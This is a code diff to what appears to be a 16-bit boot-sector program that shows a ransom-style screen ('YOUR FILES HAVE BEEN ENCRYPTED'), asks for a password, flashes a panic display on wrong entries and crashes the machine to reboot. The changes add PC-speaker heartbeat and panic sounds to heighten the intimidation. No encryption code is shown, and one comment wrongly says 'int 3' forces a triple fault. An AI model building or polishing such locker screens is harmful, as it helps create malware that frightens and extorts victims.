@@ -15,6 +15,9 @@ start:
     mov sp, 0xFFFE        ; Set Stack Pointer to the top of the segment
     sti                   ; Re-enable interrupts after stack is safe
 
+    ; Start heartbeat sound immediately
+    call init_heartbeat_sound
+
     ; Video Initialization
     mov ax, 0x0003        ; BIOS function: Set Video Mode 3 (80x25 Text, 16 colors)
     int 0x10              ; Execute video interrupt
@@ -167,6 +170,21 @@ start:
     xor si, si            ; Clear SI to use as buffer index
 
 password_input:
+    ; Add a small delay to prevent the loop from running too fast
+    mov ah, 0x86          ; BIOS function: Wait (Delay)
+    mov cx, 0             ; High word of 10,000 microseconds
+    mov dx, 10000         ; Low word (10ms delay)
+    int 0x15              ; Execution pause
+
+    ; Update heartbeat sound periodically
+    call check_and_update_heartbeat
+    
+    ; Check for keystroke without blocking
+    mov ah, 0x01          ; BIOS function: Check Keyboard Status
+    int 0x16
+    jz password_input     ; No key available, continue looping
+    
+    ; Key available, read it
     mov ah, 0x00          ; BIOS function: Get Keystroke
     int 0x16              ; Wait for user input (returns AL=ASCII)
 
@@ -237,6 +255,9 @@ compare_loop:
     loop compare_loop     ; Repeat comparison
 
 password_correct:
+    ; Stop heartbeat sound before reboot
+    call stop_sound
+
     mov dh, 24            ; Targeted row 24
     mov dl, 0             ; Start of line
     call clear_line       ; Wipe the input prompt area
@@ -257,6 +278,10 @@ password_correct:
 
 loading_loop:
     push cx               ; Preserve loop counter
+    
+    ; Update heartbeat sound during loading
+    call check_and_update_heartbeat
+    
     mov ah, 0x09          ; BIOS function: Write Char/Attribute
     mov al, '#'           ; Progress bar character
     mov bh, 0x00
@@ -301,6 +326,9 @@ loading_loop:
     int 3                 ; Force a triple fault to crash and reboot
 
 wrong_password:
+    ; Play panic sound for wrong password
+    call play_panic_sound
+    
     mov ah, 0x01          ; BIOS function: Set Cursor Shape
     mov cx, 0x2000        ; Bit 5 set (value 0x20) hides the cursor
     int 0x10
@@ -309,6 +337,9 @@ wrong_password:
 
 panic_blink_loop:
     push cx               ; Save blink count
+    
+    ; Update heartbeat sound during panic effect
+    call check_and_update_heartbeat
     
     ; Black Screen Phase
     mov ah, 0x06          ; Clear window
@@ -398,6 +429,187 @@ panic_blink_loop:
     
     xor si, si            ; Reset buffer index for new attempt
     jmp password_input    ; Jump back to keyboard listening
+
+; ============================================================================
+; HEARTBEAT SOUND FUNCTIONS - IMPROVED FOR SMOOTHER SOUND
+; ============================================================================
+
+; Function: init_heartbeat_sound
+; Description: Initialize PC speaker for smooth heartbeat sound
+init_heartbeat_sound:
+    ; Configure Programmable Interval Timer (PIT) for sound generation
+    mov al, 0xB6          ; Command byte: Channel 2, LSB then MSB, square wave
+    out 0x43, al          ; Send to PIT command port
+    
+    ; Set smoother initial frequency (600 Hz)
+    mov ax, 1193180 / 600 ; Calculate divisor for 600Hz frequency (smoother)
+    out 0x42, al          ; Send LSB to timer channel 2
+    mov al, ah
+    out 0x42, al          ; Send MSB to timer channel 2
+    
+    ; Activate PC speaker
+    in al, 0x61           ; Read current state from port 61h
+    or al, 0x03           ; Set bits 0 and 1 (enable speaker & timer gate)
+    out 0x61, al          ; Write back to activate speaker
+    
+    ; Initialize heartbeat state variables for smoother sound
+    mov byte [heartbeat_state], 0
+    mov word [heartbeat_timer], 40  ; Slower timer for realistic heartbeat
+    mov word [heartbeat_counter], 40 ; Initial counter value
+    
+    ret
+
+; Function: update_heartbeat_sound
+; Description: Update smooth heartbeat sound pattern
+update_heartbeat_sound:
+    pusha                 ; Save all registers
+    
+    ; Get current heartbeat state
+    mov al, [heartbeat_state]
+    
+    cmp al, 0
+    je .state0_beep_on1
+    cmp al, 1
+    je .state1_pause_short
+    cmp al, 2
+    je .state2_beep_on2
+    jmp .state3_pause_long
+    
+.state0_beep_on1:
+    ; First beep - activate speaker with smooth 600Hz frequency
+    in al, 0x61
+    or al, 0x03           ; Set speaker and timer gate bits
+    out 0x61, al
+    
+    ; Set smooth frequency for first beep (600 Hz)
+    mov ax, 1193180 / 600
+    out 0x42, al
+    mov al, ah
+    out 0x42, al
+    
+    inc byte [heartbeat_state]
+    mov word [heartbeat_counter], 25  ; Smooth beep duration
+    jmp .done
+    
+.state1_pause_short:
+    ; Short pause between beeps - turn off speaker
+    in al, 0x61
+    and al, 0xFC          ; Clear speaker bits (turn off sound)
+    out 0x61, al
+    
+    inc byte [heartbeat_state]
+    mov word [heartbeat_counter], 15  ; Short pause duration
+    jmp .done
+    
+.state2_beep_on2:
+    ; Second beep - activate speaker with slightly different smooth frequency
+    in al, 0x61
+    or al, 0x03           ; Set speaker and timer gate bits
+    out 0x61, al
+    
+    ; Set smooth frequency for second beep (550 Hz)
+    mov ax, 1193180 / 550
+    out 0x42, al
+    mov al, ah
+    out 0x42, al
+    
+    inc byte [heartbeat_state]
+    mov word [heartbeat_counter], 25  ; Smooth beep duration
+    jmp .done
+    
+.state3_pause_long:
+    ; Long pause between heartbeat cycles
+    in al, 0x61
+    and al, 0xFC          ; Clear speaker bits (turn off sound)
+    out 0x61, al
+    
+    ; Reset to first state for next heartbeat cycle
+    mov byte [heartbeat_state], 0
+    mov word [heartbeat_counter], 120 ; Long pause duration (about 1.2 seconds)
+    
+.done:
+    popa                  ; Restore all registers
+    ret
+
+; Function: play_panic_sound
+; Description: Play panic sound effect (rapid beeps with high frequency)
+play_panic_sound:
+    pusha
+    
+    ; Play 3 rapid panic beeps
+    mov cx, 3             ; Number of panic beeps
+    
+.panic_loop:
+    push cx
+    
+    ; Set high frequency for panic (1200 Hz)
+    mov al, 0xB6
+    out 0x43, al
+    mov ax, 1193180 / 1200  ; High frequency
+    out 0x42, al
+    mov al, ah
+    out 0x42, al
+    
+    ; Turn on speaker
+    in al, 0x61
+    or al, 0x03
+    out 0x61, al
+    
+    ; Short delay for beep
+    mov ah, 0x86
+    mov cx, 0x0001
+    mov dx, 0x86A0        ; 100ms beep
+    int 0x15
+    
+    ; Turn off speaker
+    in al, 0x61
+    and al, 0xFC
+    out 0x61, al
+    
+    ; Short pause between panic beeps
+    mov ah, 0x86
+    mov cx, 0x0000
+    mov dx, 0x4E20        ; 20ms pause
+    int 0x15
+    
+    pop cx
+    loop .panic_loop
+    
+    ; Restore normal heartbeat sound
+    call init_heartbeat_sound
+    
+    popa
+    ret
+
+; Function: check_and_update_heartbeat
+; Description: Check timer and update heartbeat if needed
+check_and_update_heartbeat:
+    pusha
+    
+    ; Decrement heartbeat timer
+    dec word [heartbeat_timer]
+    jnz .exit             ; Timer not expired, exit
+    
+    ; Timer expired, update heartbeat sound
+    call update_heartbeat_sound
+    
+    ; Reset timer with current counter value
+    mov ax, [heartbeat_counter]
+    mov [heartbeat_timer], ax
+    
+.exit:
+    popa
+    ret
+
+; Function: stop_sound
+; Description: Turn off PC speaker completely
+stop_sound:
+    push ax
+    in al, 0x61           ; Read current speaker state
+    and al, 0xFC          ; Clear bits 0 and 1 (disable speaker & timer gate)
+    out 0x61, al          ; Write back to turn off speaker
+    pop ax
+    ret
 
 redraw_screen:
     pusha                 ; Push all general purpose registers to stack
@@ -545,6 +757,13 @@ print_at_pos:
 .done:
     popa                  ; Restore all registers
     ret
+
+; ============================================================================
+; HEARTBEAT SOUND VARIABLES
+; ============================================================================
+heartbeat_state:      db 0      ; Current state in heartbeat pattern (0-3)
+heartbeat_timer:      dw 40     ; Timer counter for heartbeat updates
+heartbeat_counter:    dw 40     ; Duration for current state
 
 ; String Data Definitions
 header_bar:         db '!!!WARNING!!! YOUR FILES HAVE BEEN ENCRYPTED !!!WARNING!!!', 0
